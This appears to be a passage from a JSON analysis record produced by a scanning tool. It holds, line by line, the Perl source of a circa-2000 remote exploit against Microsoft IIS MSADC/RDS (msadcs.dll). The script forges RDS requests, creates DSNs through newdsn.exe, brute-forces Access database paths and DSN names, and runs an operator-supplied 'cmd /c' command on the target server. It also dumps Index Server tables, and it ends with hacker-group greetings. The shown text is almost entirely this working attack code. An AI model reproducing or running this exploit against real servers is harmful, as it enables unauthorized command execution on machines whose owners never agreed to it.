            "$req.= \"\\x08\\x00\" . pack (\"S1\", length($t1));",
            "$req.= \"\\x00\\x00\" . $t1 ;",
            "$req.= \"\\x08\\x00\" . pack (\"S1\", length($t2));",
            "$req.= \"\\x00\\x00\" . $t2 ;",
            "$req.=\"\\r\\n--!ADM!ROX!YOUR!WORLD!--\\r\\n\";",
            "return $req;}",
            "##############################################################################",
            "sub make_unicode { # quick little function to convert to unicode",
            "my ($in)=@_; my $out;",
            "for ($c=0; $c < length($in); $c++) { $out.=substr($in,$c,1) . \"\\x00\"; }",
            "return $out;}",
            "##############################################################################",
            "sub rdo_success {  # checks for RDO return success (this is kludge)",
            "my (@in) = @_; my $base=content_start(@in);",
            "if($in[$base]=~/multipart\\/mixed/){",
            "return 1 if( $in[$base+10]=~/^\\x09\\x00/ );}",
            "return 0;}",
            "##############################################################################",
            "sub make_dsn {  # this (tries to) make a DSN for us",
            "print \"\\nMaking DSN: \";",
            "foreach $drive (@drives) {",
            "print \"$drive: \";",
            "my @results=sendraw(\"GET /scripts/tools/newdsn.exe?driver=Microsoft\\%2B\" .",
            "\t\"Access\\%2BDriver\\%2B\\%28*.mdb\\%29\\&dsn=wicca\\&dbq=\"",
            "\t. $drive . \"\\%3A\\%5Csys.mdb\\&newdb=CREATE_DB\\&attr= HTTP/1.0\\n\\n\");",
            "$results[0]=~m#HTTP\\/([0-9\\.]+) ([0-9]+) ([^\\n]*)#;",
            "return 0 if $2 eq \"404\"; # not found/doesn't exist",
            "if($2 eq \"200\") {",
            "  foreach $line (@results) {",
            "    return 1 if $line=~/<H2>Datasource creation successful<\\/H2>/;}}",
            "} return 0;}",
            "##############################################################################",
            "sub verify_exists {",
            "my ($page)=@_;",
            "my @results=sendraw(\"GET $page HTTP/1.0\\n\\n\");",
            "return $results[0];}",
            "##############################################################################",
            "sub try_btcustmr {",
            "foreach $dir (@sysdirs) {",
            " print \"$dir -> \"; # fun status so you can see progress",
            " foreach $drive (@drives) {",
            " print \"$drive: \";  # ditto",
            "$reqlen=length( make_req(1,$drive,$dir) ) - 28;",
            "$reqlenlen=length( \"$reqlen\" );",
            "$clen= 206 + $reqlenlen + $reqlen;",
            "my @results=sendraw(make_header() . make_req(1,$drive,$dir));",
            "if (rdo_success(@results)){print \"Success!\\n\";",
            "save(\"dbq=\".$drive.\":\\\\\".$dir.\"\\\\help\\\\iis\\\\htm\\\\tutorial\\\\btcustmr.mdb;\");",
            "\texit;}",
            "else { verbose(odbc_error(@results)); funky(@results);}} print \"\\n\";}}",
            "##############################################################################",
            "sub odbc_error {",
            "my (@in)=@_; my $base;",
            "my $base = content_start(@in);",
            "if($in[$base]=~/application\\/x-varg/){ # it *SHOULD* be this",
            "$in[$base+4]=~s/[^a-zA-Z0-9 \\[\\]\\:\\/\\\\'\\(\\)]//g; ",
            "$in[$base+5]=~s/[^a-zA-Z0-9 \\[\\]\\:\\/\\\\'\\(\\)]//g; ",
            "$in[$base+6]=~s/[^a-zA-Z0-9 \\[\\]\\:\\/\\\\'\\(\\)]//g; ",
            "return $in[$base+4].$in[$base+5].$in[$base+6];}",
            "print \"\\nNON-STANDARD error.  Please sent this info to rfp\\@wiretrip.net:\\n\";",
            "print \"$in : \" . $in[$base] . $in[$base+1] . $in[$base+2] . $in[$base+3] .",
            "\t$in[$base+4] . $in[$base+5] . $in[$base+6]; exit;}",
            "##############################################################################",
            "sub verbose {",
            "my ($in)=@_;",
            "return if !$verbose;",
            "print STDOUT \"\\n$in\\n\";}",
            "##############################################################################",
            "sub save {",
            "my ($p1)=@_; my $ropt=\"\";",
            "open(OUT, \">rds.save\") || print \"Problem saving parameters...\\n\";",
            "if (defined $args{c}){ $ropt=\"c \";}",
            "if (defined $args{V}){ $ropt.=\"V \";}",
            "if (defined $args{w}){ $ropt.=\"w \";}",
            "print OUT \"v2\\n$ip\\n$ropt\\n$p1\\n\";",
            "close OUT;}",
            "##############################################################################",
            "sub load {",
            "my ($action)=@_;",
            "my @p; my $drvst=\"driver={Microsoft Access Driver (*.mdb)};\";",
            "open(IN,\"<rds.save\") || die(\"Couldn't open rds.save\\n\");",
            "@p=<IN>; close(IN);",
            "die(\"Wrong rds.save version\") if $p[0] ne \"v2\\n\";",
            "$ip=\"$p[1]\"; $ip=~s/\\n//g;",
            "$target= inet_aton($ip) || die(\"inet_aton problems\");",
            "print \"Resuming to $ip ...\";",
            "@switches=split(/ /,$p[2]);",
            "foreach $switch (@switches) {",
            "\t$args{$switch}=\"1\";}",
            "if (defined $args{w}){$comm=\"command /c\";} else {$comm=\"cmd /c\";}",
            "print \"Type the command line you want to run ($comm assumed):\\n\"",
            "\t. \"$comm \";",
            "$in=<STDIN>;    chomp $in;",
            "$command=\"$comm \" . $in ;",
            "$torun=\"$p[3]\"; $torun=~s/\\n//g;",
            "if($torun=~/btcustmr/){ ",
            "\t$args{'c'}=\"1\";}   # this is a kludge to make it work",
            "if($torun=~/^dbq/){ $torun=$drvst.$torun; }",
            "if(run_query(\"$torun\")){",
            "\tprint \"Success!\\n\";} else { print \"failed\\n\"; }",
            "exit;}",
            "##############################################################################",
            "sub create_table {",
            "return 1 if (!defined $args{c});",
            "return 1 if (defined $args{V});",
            "my ($in)=@_;",
            "$reqlen=length( make_req(2,$in,\"\") ) - 28;",
            "$reqlenlen=length( \"$reqlen\" );",
            "$clen= 206 + $reqlenlen + $reqlen;",
            "my @results=sendraw(make_header() . make_req(2,$in,\"\"));",
            "return 1 if rdo_success(@results);",
            "my $temp= odbc_error(@results);  verbose($temp);",
            "return 1 if $temp=~/Table 'AZZ' already exists/;",
            "return 0;}",
            "##############################################################################",
            "sub known_dsn {",
            "foreach $dSn (@dsns) {",
            "\tprint \".\";",
            "\tnext if (!is_access(\"DSN=$dSn\"));",
            "\tif(create_table(\"DSN=$dSn\")){",
            "\tif(run_query(\"DSN=$dSn\")){",
            "\tprint \"$dSn: Success!\\n\"; save (\"dsn=$dSn\"); exit; }}} print \"\\n\";}",
            "##############################################################################",
            "sub is_access {",
            "my ($in)=@_;",
            "return 1 if (!defined $args{c});",
            "return 1 if (defined $args{V});",
            "$reqlen=length( make_req(5,$in,\"\") ) - 28;",
            "$reqlenlen=length( \"$reqlen\" );",
            "$clen= 206 + $reqlenlen + $reqlen;",
            "my @results=sendraw(make_header() . make_req(5,$in,\"\"));",
            "my $temp= odbc_error(@results);",
            "verbose($temp); return 1 if ($temp=~/Microsoft Access/);",
            "return 0;}",
            "##############################################################################",
            "sub run_query {",
            "my ($in)=@_; my $req;",
            "if (defined $args{c}){$req=3;} else {$req=6;}",
            "$reqlen=length( make_req($req,$in,\"\") ) - 28;",
            "$reqlenlen=length( \"$reqlen\" );",
            "$clen= 206 + $reqlenlen + $reqlen;",
            "my @results=sendraw(make_header() . make_req($req,$in,\"\"));",
            "return 1 if rdo_success(@results);",
            "my $temp= odbc_error(@results);  verbose($temp);",
            "return 0;}",
            "##############################################################################",
            "sub known_mdb {",
            "my @drives=(\"c\",\"d\",\"e\",\"f\",\"g\");",
            "my @dirs=(\"winnt\",\"winnt35\",\"winnt351\",\"win\",\"windows\");",
            "my $dir, $drive, $mdb;",
            "my $drv=\"driver={Microsoft Access Driver (*.mdb)}; dbq=\";",
            "foreach $drive (@drives) {",
            " foreach $dir (@sysdirs){",
            "  foreach $mdb (@sysmdbs) {",
            "   print \".\";",
            "   if(create_table($drv.$drive.\":\\\\\".$dir.$mdb)){",
            "    if(run_query($drv . $drive . \":\\\\\" . $dir . $mdb)){",
            "     print \"$mdb: Success!\\n\"; save (\"dbq=\".$drive .\":\\\\\".$dir.$mdb); exit; ",
            "    }}}}}",
            " foreach $drive (@drives) {",
            "  foreach $mdb (@mdbs) {",
            "   print \".\";",
            "   if(create_table($drv.$drive.\":\".$mdb)){",
            "    if(run_query($drv.$drive.\":\".$mdb)){",
            "     print \"$mdb: Success!\\n\"; save (\"dbq=\".$drive.\":\".$mdb); exit; ",
            "    }}}}",
            "##############################################################################",
            "sub hork_idx {",
            "print \"\\nAttempting to dump Index Server tables...\\n\";",
            "print \"  NOTE:  Sometimes this takes a while, other times it stalls\\n\\n\";",
            "$reqlen=length( make_req(4,\"\",\"\") ) - 28;",
            "$reqlenlen=length( \"$reqlen\" );",
            "$clen= 206 + $reqlenlen + $reqlen;",
            "my @results=sendraw(make_header() . make_req(4,\"\",\"\"));",
            "if (rdo_success(@results)){",
            "my $max=@results; my $c; my %d;",
            "for($c=19; $c<$max; $c++){",
            "\t$results[$c]=~s/\\x00//g;",
            "\t$results[$c]=~s/[^a-zA-Z0-9:~ \\\\\\._]{1,40}/\\n/g;",
            "\t$results[$c]=~s/[^a-zA-Z0-9:~ \\\\\\._\\n]//g;",
            "\t$results[$c]=~/([a-zA-Z]\\:\\\\)([a-zA-Z0-9 _~\\\\]+)\\\\/;",
            "\t$d{\"$1$2\"}=\"\";}",
            "foreach $c (keys %d){ print \"$c\\n\"; }",
            "} else {print \"Index server not installed/query failed\\n\"; }}",
            "##############################################################################",
            "sub dsn_dict {",
            "open(IN, \"<$args{e}\") || die(\"Can't open external dictionary\\n\");",
            "while(<IN>){",
            "\t$hold=$_; $hold=~s/[\\r\\n]//g; $dSn=\"$hold\"; print \".\";",
            "\tnext if (!is_access(\"DSN=$dSn\"));",
            "\tif(create_table(\"DSN=$dSn\")){",
            "\tif(run_query(\"DSN=$dSn\")){",
            "\tprint \"Success!\\n\"; save (\"dsn=$dSn\"); exit; }}} ",
            "print \"\\n\"; close(IN);}",
            "##############################################################################",
            "sub content_start { # this will take in the server headers",
            "my (@in)=@_; my $c;",
            "for ($c=1;$c<500;$c++) { # assume there's less than 500 headers",
            " if($in[$c] =~/^\\x0d\\x0a/){",
            "  if ($in[$c+1]=~/^HTTP\\/1.[01] [12]00/) { $c++; }",
            "  else { return $c+1; }}}",
            "return -1;} # it should never get here actually ",
            "##############################################################################",
            "sub funky {",
            "my (@in)=@_; my $error=odbc_error(@in);",
            "if($error=~/ADO could not find the specified provider/){",
            "print \"\\nServer returned an ADO miscofiguration message\\nAborting.\\n\";",
            "exit;}",
            "if($error=~/A Handler is required/){",
            "print \"\\nServer has custom handler filters (they most likely are patched)\\n\";",
            "exit;}",
            "if($error=~/specified Handler has denied Access/){",
            "print \"\\nADO handlers denied access (they most likely are patched)\\n\";",
            "exit;}",
            "if($error=~/server has denied access/){",
            "print \"\\nADO handlers denied access (they most likely are patched)\\n\";",
            "exit;}}",
            "##############################################################################",
            "sub has_msadc {",
            "my @results=sendraw(\"GET /msadc/msadcs.dll HTTP/1.0\\n\\n\");",
            "my $base=content_start(@results);",
            "return if($results[$base]=~/Content-Type: application\\/x-varg/);",
            "my @s=grep(\"^Server:\",@results);",
            "if($s[0]!~/IIS/){ print \"Doh! They're not running IIS.\\n$s[0]\\n\" }",
            "else { print \"/msadc/msadcs.dll was not found.\\n\";}",
            "exit;}",
            "##############################################################################",
            "sub use_unc {",
            "$uncpath=$args{u};",
            "$driverline=\"driver={Microsoft Access Driver (*.mdb)};dbq=\";",
            "if(!$uncpath=~/^\\\\\\\\[a-zA-Z0-9_.]+\\\\[-a-zA-Z0-9_]+\\\\.+/){",
            "\tprint   \"Your UNC path sucks.  You need the following format:\\n\".",
            "\t\t\"\\\\server(ip preferable)\\share\\some-file.mdb\\n\\n\"; exit; }",
            "if(create_table($driverline.$uncpath)){",
            "  if(run_query($driverline.$uncpath)){",
            "     print \"Success!\\n\"; save (\"dbq=\".$uncpath); exit;}}",
            "##############################################################################",
            "sub get_name { # this was added last minute",
            "my $msadc=<<EOT",
            "POST /msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetMachineName HTTP/1.1",
            "User-Agent: ACTIVEDATA",
            "Host: $ip",
            "Content-Length: 126",
            "Connection: Keep-Alive",
            "ADCClientVersion:01.06",
            "Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=0",
            "--!ADM!ROX!YOUR!WORLD!--",
            ";  $msadc=~s/\\n/\\r\\n/g;",
            "my @results=sendraw($msadc);",
            "my $base=content_start(@results);",
            "$results[$base+6]=~s/[^-A-Za-z0-9!\\@\\#\\$\\%^\\&*()\\[\\]_=+~<>.,?]//g;",
            "print \"Machine name: $results[$base+6]\\n\";}",
            "##############################################################################",
            "# special greets to trambottic, hex_edit, vacuum (technotronic), all #!adm,",
            "# #!w00w00 & #rhino9 (that's a lot of people, and they are all very elite and ",
            "# good friends!), wiretrip, l0pht, nmrc & all of phrack",
            "# thumbs up to packetstorm, hackernews, phrack, securityfocus, ntsecadvice",
            "# I wish I could really name everyone, but I can't.  Don't feel slighted if",
            "# your not on the list... :)",
            "##############################################################################",
            "#                 www.hack.co.za           [2000]#"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.386589",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
